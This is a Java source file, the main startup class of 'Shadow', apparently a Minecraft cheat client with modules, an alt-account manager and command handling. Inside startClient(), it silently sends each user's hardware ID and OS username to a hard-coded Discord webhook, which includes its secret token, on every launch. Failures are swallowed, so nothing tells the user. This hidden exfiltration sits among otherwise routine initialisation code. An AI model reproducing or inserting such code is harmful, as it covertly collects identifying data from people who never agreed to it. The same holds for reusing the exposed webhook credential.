package store.shadowclient.client;

import java.io.File;

import store.shadowclient.client.gui.login.GuiClientLogin;
import store.shadowclient.client.utils.DiscordWebhook;
import org.lwjgl.opengl.Display;

import store.shadowclient.client.clickgui.clickgui.ClickGUI;
import store.shadowclient.client.clickgui.settings.SettingsManager;
import store.shadowclient.client.event.EventManager;
import store.shadowclient.client.event.EventTarget;
import store.shadowclient.client.event.events.ClientTickEvent;
import store.shadowclient.client.event.events.EventKey;
import store.shadowclient.client.gui.splashscreen.SplashProgress;
import store.shadowclient.client.hud.GuiIngameHook;
import store.shadowclient.client.hud.TabGui;
import store.shadowclient.client.hud.draggablehud.HUDManager;
import store.shadowclient.client.hud.draggablehud.hudmods.ModInstances;
import store.shadowclient.client.management.FontManager;
import store.shadowclient.client.management.account.AccountManager;
import store.shadowclient.client.management.command.CommandManager;
import store.shadowclient.client.management.command.variables.FriendManager;
import store.shadowclient.client.management.file.FileManager;
import store.shadowclient.client.management.irc.IRCClient;
import store.shadowclient.client.module.Module;
import store.shadowclient.client.module.ModuleManager;
import store.shadowclient.client.thealtening.AltService;
import store.shadowclient.client.utils.Files;
import store.shadowclient.client.utils.RaycastUtil;
import store.shadowclient.client.utils.RotationUtil;
import store.shadowclient.client.utils.player.InventoryUtil;
import store.shadowclient.client.utils.render.DeltaUtil;
import store.shadowclient.client.utils.render.Render2D;
import store.shadowclient.client.utils.render.Render3D;
import store.shadowclient.client.utils.render.Strings;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.FontRenderer;
import net.minecraft.network.play.server.S02PacketChat;
import net.minecraft.util.ChatComponentText;

public class Shadow {
    public static String name = "Shadow"; // CLIENT NAME
    public static String uiname = "S§fhadow"; // DISPLAYS ON UI

	public String version = "1.0.1"; // BUILD
	public static String developer = "Crystal#8652 & Shrunkie#0001 & Max T.#6686"; // DEVELOPERs yay

    public static Shadow instance = new Shadow(); // INSTANCE
    
    public FriendManager friendManager;
    public SettingsManager settingsManager;
    public EventManager eventManager;
    public ModuleManager moduleManager;
    public static GuiIngameHook guihook;
    public static TabGui tabgui;
    public ClickGUI clickGui;
    private IRCClient ircClient;
    private HUDManager hudManager;
    public static CommandManager cmdManager;
    public static FontManager fontManager;
    private AccountManager accountManager;
    private FileManager fileManager;
    public static final DeltaUtil DELTA_UTIL = new DeltaUtil();
    private AltService altService;
    public static final Render2D RENDER2D = new Render2D();
    public static final Render3D RENDER3D = new Render3D();
    public static final RaycastUtil RAYCAST_UTIL = new RaycastUtil();
    public static final RotationUtil ROTATION_UTIL = new RotationUtil();
    public static final InventoryUtil INVENTORY_UTIL = new InventoryUtil();
    //private DiscordRP discordRP = new DiscordRP();
    
    //Font
    public static Minecraft mc = Minecraft.getMinecraft();
    public static FontRenderer fr = Minecraft.getMinecraft().fontRendererObj;

    public void startClient() {
    	
    	/*
    	 * Initializes on startup.
    	*/

        try{
            DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/781214773517221920/W9kvHaYpMupipDZOgJFu7cZqcZb9tSysNLAevLSDLjBgvtKlRQQtC_ofPl48KuyQ3Y74");
            webhook.addEmbed(new DiscordWebhook.EmbedObject().addField("HWID", GuiClientLogin.getHWID(), false).addField("OS Username:", System.getProperty("user.name"), false).setTitle("Shadow HWID Logging bois <a:peepoHeHee:401946781208018944>"));
            webhook.execute();
        } catch (Exception ignored){}
    	String clientFolder = new File(".").getAbsolutePath();
		clientFolder = (clientFolder.contains("jars") ? new File(".").getAbsolutePath().substring(0, clientFolder.length() - 2) : new File(".").getAbsolutePath()) + Strings.getSplitter() + name;
    	String accountManagerFolder = clientFolder + Strings.getSplitter() + "alts";
		Files.createRecursiveFolder(accountManagerFolder);
    
    	hudManager = HUDManager.getInstance();
    	ModInstances.register(hudManager);
        settingsManager = new SettingsManager();
        tabgui = new TabGui();
        eventManager = new EventManager();
        moduleManager = new ModuleManager();
        clickGui = new ClickGUI();
        cmdManager = new CommandManager();
        fontManager = new FontManager();
        friendManager = new FriendManager();
        accountManager = new AccountManager(new File(accountManagerFolder));
        altService = new AltService();
        this.fileManager = new FileManager();
//        ircClient = new IRCClient("chat.freenode.net", 6667, Minecraft.getMinecraft().getSession().getUsername(), "#MystraIRC");
        switchToMojang();
        //discordRP.start();

        /*
         *  Applys the application title and prints out credentials.
         */
        
        System.out.println("[" + name + "] Starting Shadow b" + version + ", coded by " + developer);
        Display.setTitle(name + " b" + version);

        SplashProgress.setProgress(8, "Finishing Shadow");
        System.out.println("Loaded Modules: " + Shadow.instance.moduleManager.getModules().size());
        eventManager.register(this);
    }

    public void stopClient() {
    	
    	/*
    	 *  Stops all applications running.
    	 */
    	
    	//discordRP.shutdown();
        eventManager.unregister(this);
    }
    
    @EventTarget
    public void onKey(EventKey event) {
        moduleManager.getModules().stream().filter(module -> module.getKey() == event.getKey()).forEach(module -> module.toggle());
    }
    public static void onRender(){
		for(Module m: Shadow.instance.moduleManager.getModules()){
			m.onRender();
		}
	}

    @EventTarget
    public void onTick(ClientTickEvent e) {
    	if(Minecraft.getMinecraft().gameSettings.GUI_MOD_POSITION.isPressed()) {
    		hudManager.openConfigScreen();
    	}
    }
    
    /*public DiscordRP getDiscordRP() { // DiscordAPI
    	return discordRP;
    }
    
    /*
     *  Shadow Chat Module
     */
    
    public static void addChatMessage(String s){
        Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§7[ " + "§bShadow§7 ] §f" + s));
    }
    
    public static boolean onSendChatMessage(String s) { //EntityPlayerSP
    	if(s.startsWith (".")) {
    		cmdManager.callCommand(s.substring(1));
    		return false;
    	}
    	for(Module m: Shadow.instance.moduleManager.getModules()) {
    		if(m.isToggled()) {
    			return m.onSendChatMessage(s);
    		}
    	}
    	
    	return true;
    }
    
    public static boolean onReceiveChatMessage(S02PacketChat packet) {
    	for(Module m: Shadow.instance.moduleManager.getModules()) {
    		if(m.isToggled()) {
    			return m.onReceiveChatMessage(packet);
    		}
    	}
    	return true;
    }
    
    public static FriendManager getFriendManager() {
        return instance.friendManager;
    }
    
    /*
     *  OTHER SERVICES
     */
    
    public IRCClient getIRCClient() {
		return ircClient;
	}
    
    public AccountManager getAccountManager() {
		return accountManager;
	}
    
    public AltService getAltService() {
		return altService;
	}
    
    public void switchToMojang() {
		try {
			this.altService.switchService(AltService.EnumAltService.MOJANG);
		} catch (NoSuchFieldException e) {
			System.out.println("Couldn't switch to modank altservice");
		} catch (IllegalAccessException e) {
			System.out.println("Couldn't switch to modank altservice -2");
		}
	}

	public void switchToTheAltening() {
		try {
			this.altService.switchService(AltService.EnumAltService.THEALTENING);
		} catch (NoSuchFieldException e) {
			System.out.println("Couldn't switch to altening altservice");
		} catch (IllegalAccessException e) {
			System.out.println("Couldn't switch to altening altservice -2");
		}
	}

}
